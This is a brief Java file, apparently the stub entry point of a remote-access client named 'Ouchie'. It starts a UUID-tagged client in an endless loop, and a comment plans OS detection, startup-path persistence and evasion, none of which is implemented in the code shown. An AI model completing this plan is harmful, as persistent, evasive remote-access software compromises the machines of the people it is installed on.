package com.revsn.client;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.nio.file.Files;
import java.util.UUID;

public class Ouchie {
    
    public static void main(String[] args) {
        /*
            -Check which OS
            -Startup Path
            -Persitence
            -New Client with UUID
            -Maybe some Evasion
        */

        new Ouchie();

        UUID uniqueID = UUID.randomUUID();
        Client client = new Client(uniqueID);

        while(true) {
            client.run();
        }
    }

    public Ouchie() {
        
    }
}
